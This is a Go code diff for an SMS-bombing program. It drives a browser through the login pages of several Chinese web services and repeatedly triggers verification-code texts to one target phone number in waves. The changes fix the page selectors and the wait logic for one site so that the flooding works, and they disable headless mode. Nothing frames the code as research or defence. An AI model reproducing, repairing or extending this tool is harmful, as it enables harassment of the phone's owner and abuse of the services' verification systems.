@@ -32,7 +32,7 @@ var (
 	isLoadImg = false
 
 	// 是否为无头浏览器
-	isHeadless = true
+	isHeadless = false
 )
 
 func main() {
@@ -56,14 +56,14 @@ func main() {
 		fmt.Println("轰炸任务开始执行，当前波次[", i+1, "]")
 
 		// 添加任务
-		waitGroup.Add(7)
-		go ddjbSendCode() // 多多进宝
-		go jlmfSenCode()  // 居里买房
-		go wbtcSendCode() // 58同城
-		go ltdSendCode()  // LTD营销云
-		go dhlSendCode()  // 订花乐
-		go xrsSendCode()  // 学而思
-		go ksSendCode()   // 快手
+		waitGroup.Add(1)
+		// go ddjbSendCode() // 多多进宝
+		// go jlmfSenCode()  // 居里买房
+		// go wbtcSendCode() // 58同城
+		go ltdSendCode() // LTD营销云
+		// go dhlSendCode()  // 订花乐
+		// go xrsSendCode()  // 学而思
+		// go ksSendCode()   // 快手
 	}
 
 	waitGroup.Wait()
@@ -242,10 +242,10 @@ func ltdSendCode() {
 		loginUrl = `https://wei.ltd.com/user/#/auth/login?redirect=%2Fhome`
 
 		// 手机号
-		mobilePhonePath = `#pane-first > div > div:nth-child(2) > div > div > input`
+		mobilePhonePath = `#pane-first > div > div.el-form-item.is-error.is-required > div > div.user-name.el-input.el-input--prefix > input`
 
 		// 发送验证码
-		sendCodePath = `#pane-first > div > div:nth-child(3) > div > div > div > button > span`
+		sendCodePath = `#pane-first > div > div:nth-child(3) > div > div > div > button`
 
 		// 计时器
 		timepiece string
@@ -267,6 +267,7 @@ func ltdSendCode() {
 
 	err := chromedp.Run(ctx,
 		chromedp.Navigate(loginUrl),
+		chromedp.WaitVisible(mobilePhonePath),
 		chromedp.SendKeys(mobilePhonePath, phoneNum),
 		chromedp.Click(sendCodePath),
 		chromedp.Sleep(2*time.Second),
